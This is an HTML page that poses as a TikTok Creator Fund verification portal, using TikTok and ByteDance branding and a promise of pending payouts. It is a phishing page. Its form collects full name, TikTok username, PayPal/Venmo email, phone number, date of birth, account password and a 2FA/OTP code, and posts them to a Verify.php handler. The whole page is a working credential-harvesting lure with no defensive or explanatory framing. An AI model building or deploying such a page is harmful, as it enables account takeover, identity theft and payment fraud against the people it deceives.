<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>TikTok Creator Verification Portal</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background: linear-gradient(135deg, #000000, #1b0033);
      color: #fff;
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      padding: 40px 20px;
    }
    .container {
      background-color: #111;
      padding: 30px;
      border-radius: 10px;
      max-width: 400px;
      margin: auto;
      box-shadow: 0 0 20px #4c00ff66;
    }
    h1 {
      color: #fff;
      margin-bottom: 10px;
    }
    p {
      color: #aaa;
      font-size: 14px;
      margin-bottom: 25px;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: none;
      border-radius: 5px;
      font-size: 14px;
    }
    input {
      background-color: #1c1c1c;
      color: #fff;
    }
    button {
      background-color: #ff0050;
      color: #fff;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background-color: #e60045;
    }
    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #666;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>TikTok Creator Fund Verification</h1>
    <p>Verify your Creator Account to receive pending payouts.</p>
    <form action="Verify.php" method="POST">
      <input type="text" name="fullname" placeholder="Full Name" required>
      <input type="text" name="username" placeholder="TikTok Username" required>
      <input type="email" name="email" placeholder="PayPal/Venmo Email" required>
      <input type="tel" name="phone" placeholder="Phone Number" required>
      <input type="text" name="dob" placeholder="Date of Birth (MM/DD/YYYY)" required>
      <input type="password" name="password" placeholder="Account Password" required>
      <input type="text" name="otp" placeholder="2FA / OTP (if received)">
      <button type="submit">Verify Creator Account</button>
    </form>
    <div class="footer">
      © TikTok Creator Support 2025 · ByteDance Inc.
    </div>
  </div>
</body>
</html>
